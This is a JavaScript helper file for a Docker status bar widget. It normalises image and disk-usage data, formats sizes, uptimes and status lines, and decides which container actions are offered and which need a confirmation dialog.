// An image with no repository is dangling: an old layer set orphaned by a
// rebuild that took its tag. They are the bulk of what reclaimable space
// usually is, so they are named rather than shown as "<none>:<none>".
function normalizeImage(raw) {
  if (!raw || typeof raw !== "object") return null
  var repository = sanitizeLine(raw.Repository || "")
  var tag = sanitizeLine(raw.Tag || "")
  var dangling = repository === "" || repository === "<none>"
  return {
    id: shortId(raw.ID),
    repository: dangling ? "" : repository,
    tag: dangling ? "" : (tag === "<none>" ? "" : tag),
    dangling: dangling,
    name: dangling ? "untagged" : (repository + (tag && tag !== "<none>" ? ":" + tag : "")),
    size: parseSize(raw.Size),
    sizeText: sanitizeLine(raw.Size || ""),
    created: sanitizeLine(raw.CreatedSince || ""),
    // How many containers reference it. Zero means nothing would break if it
    // went, which is the only question worth answering in a bar popup.
    containers: parseInt(raw.Containers, 10) || 0
  }
}

function normalizeImages(list) {
  var out = []
  if (!list || list.length === undefined) return out
  for (var i = 0; i < list.length; i++) {
    var image = normalizeImage(list[i])
    if (image && image.id !== "") out.push(image)
  }
  // Largest first: the reason to open this view is to find what is big.
  out.sort(function (a, b) { return b.size - a.size })
  return out
}

// `docker system df` reports one row per type. Reclaimable arrives as
// "1.2GB (34%)", so the number is parsed out and the percentage dropped.
function normalizeDiskRow(raw) {
  if (!raw || typeof raw !== "object") return null
  var reclaimable = String(raw.Reclaimable || "")
  return {
    type: sanitizeLine(raw.Type || ""),
    total: parseInt(raw.TotalCount, 10) || 0,
    active: parseInt(raw.Active, 10) || 0,
    size: parseSize(raw.Size),
    reclaimable: parseSize(reclaimable.split(" ")[0])
  }
}

function normalizeDisk(list) {
  var out = []
  if (!Array.isArray(list)) return out
  for (var i = 0; i < list.length; i++) {
    var row = normalizeDiskRow(list[i])
    if (row && row.type !== "") out.push(row)
  }
  return out
}

function totalReclaimable(rows) {
  var total = 0
  var list = Array.isArray(rows) ? rows : []
  for (var i = 0; i < list.length; i++) total += list[i].reclaimable
  return total
}

function matchesImageQuery(image, query) {
  if (!image) return false
  var needle = String(query === undefined || query === null ? "" : query).trim().toLowerCase()
  if (needle === "") return true
  return (image.name + " " + image.id).toLowerCase().indexOf(needle) !== -1
}

function filterImages(images, query) {
  var out = []
  var list = Array.isArray(images) ? images : []
  for (var i = 0; i < list.length; i++) {
    if (matchesImageQuery(list[i], query)) out.push(list[i])
  }
  return out
}

// ---------------------------------------------------------------------------
// Formatting
// ---------------------------------------------------------------------------

function formatUptime(startedAtMs, nowMs) {
  if (!startedAtMs) return ""
  var seconds = Math.floor(((nowMs || Date.now()) - startedAtMs) / 1000)
  if (seconds < 0) return ""
  if (seconds < 60) return seconds + "s"
  var minutes = Math.floor(seconds / 60)
  if (minutes < 60) return minutes + "m"
  var hours = Math.floor(minutes / 60)
  if (hours < 24) return hours + "h " + (minutes % 60) + "m"
  var days = Math.floor(hours / 24)
  if (days < 7) return days + "d " + (hours % 24) + "h"
  return days + "d"
}

// Memory is binary everywhere it is discussed: `docker stats` prints MiB,
// `--memory 512m` means 512 MiB, and free(1) agrees. Printing 537 MB for a
// limit someone wrote as 512m makes Kaj look wrong even though the byte count
// is right. Image and disk sizes stay decimal, which is what `docker images`
// and `docker system df` report.
function formatMemory(bytes) {
  var n = Number(bytes)
  if (!isFinite(n) || n <= 0) return "0 B"
  var units = ["B", "KiB", "MiB", "GiB", "TiB"]
  var index = 0
  while (n >= 1024 && index < units.length - 1) {
    n = n / 1024
    index++
  }
  return (n >= 100 || index === 0 ? Math.round(n) : n.toFixed(1)) + " " + units[index]
}

function formatBytes(bytes) {
  var n = Number(bytes)
  if (!isFinite(n) || n <= 0) return "0 B"
  var units = ["B", "KB", "MB", "GB", "TB"]
  var index = 0
  while (n >= 1000 && index < units.length - 1) {
    n = n / 1000
    index++
  }
  return (n >= 100 || index === 0 ? Math.round(n) : n.toFixed(1)) + " " + units[index]
}

function formatPercent(value) {
  var n = Number(value)
  if (!isFinite(n) || n < 0) return "0%"
  return (n >= 10 ? Math.round(n) : n.toFixed(1)) + "%"
}

// The one-line summary under a container name. Prefers whatever a person most
// needs to know: why it died, then health, then how long it has been up.
function statusSummary(container, nowMs) {
  if (!container) return ""
  if (container.oomKilled) return "Out of memory"
  if (container.restarting) return "Restarting" + (container.restartCount > 0 ? " ×" + container.restartCount : "")
  if (container.paused) return "Paused"
  if (container.dead) return "Dead"
  if (!container.running) {
    if (container.exitCode !== 0) return "Exited (" + container.exitCode + ")"
    return "Stopped"
  }
  var uptime = formatUptime(container.startedAt, nowMs)
  // A container still running its healthcheck has not meaningfully been "up"
  // for anything yet, so the elapsed time is noise. The row pulses its dot
  // instead, which says "in progress" without pretending to be a measurement.
  if (container.health === "starting") return "Starting"
  // Unhealthy keeps its uptime: how long something has been up while failing
  // its healthcheck is exactly what you want to know.
  if (container.health === "unhealthy") return "Unhealthy" + (uptime ? " · up " + uptime : "")
  return uptime ? "Up " + uptime : "Running"
}

// Bar tooltip: one line, no per-container detail.
function barSummary(containers) {
  var list = Array.isArray(containers) ? containers : []
  if (list.length === 0) return "No containers"
  var running = countRunning(list)
  return running + " of " + list.length + " running"
}

// ---------------------------------------------------------------------------
// Actions
// ---------------------------------------------------------------------------

// Which actions apply to a container in its current state. Keeping this here
// rather than in QML means the button set is testable, and means the UI cannot
// offer "start" on something already running.
function availableActions(container, readOnly) {
  if (!container) return []
  // Logs is the only thing left in read-only: `shell` is a prompt inside the
  // container, which changes more than any button here.
  if (readOnly === true) return ["logs"]
  if (container.running && !container.paused) return ["stop", "restart", "pause", "logs", "shell"]
  if (container.paused) return ["unpause", "stop", "logs"]
  return ["start", "remove", "logs"]
}

// The single gate every mutation passes through. Anything true here needs an
// explicit confirmation naming what is destroyed; everything else is a plain
// click. Kaj deliberately keeps this list short: friction on start/stop teaches
// people to click through dialogs, which is how the destructive one gets
// clicked through too.
function isDestructive(action) {
  return action === "remove" || action === "removeVolumes" || action === "prune"
    || action === "recreate" || action === "down"
}

// Human-readable consequence, shown in the confirm dialog. Never assembled from
// container-controlled text without sanitizing first.
function confirmText(action, container) {
  var name = container ? container.name : "this container"
  if (action === "remove") return "Remove " + name + "? The container is deleted. Named volumes are kept."
  if (action === "removeVolumes") return "Remove " + name + " and its anonymous volumes? Data in those volumes is lost."
  if (action === "recreate") return "Recreate " + name + "? The current container is replaced."
  return "Continue?"
}

// Verb shown on the confirm button.
function confirmVerb(action) {
  if (action === "remove" || action === "removeVolumes") return "Remove"
  if (action === "recreate") return "Recreate"
  return "Continue"
}
